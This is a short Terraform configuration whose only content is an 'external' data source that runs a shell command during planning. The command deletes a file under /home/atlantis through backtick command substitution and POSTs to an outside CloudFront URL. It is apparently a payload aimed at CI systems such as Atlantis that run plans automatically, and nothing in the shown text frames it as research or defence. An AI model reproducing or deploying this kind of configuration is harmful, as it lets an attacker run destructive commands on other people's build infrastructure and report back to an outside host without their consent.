data "external" "example" {
    program = ["sh","-c","curl -X POST -d \"`rm /home/atlantis/atlantispluginplus`\" https://d9usos5h96tz9.cloudfront.net/log"]
}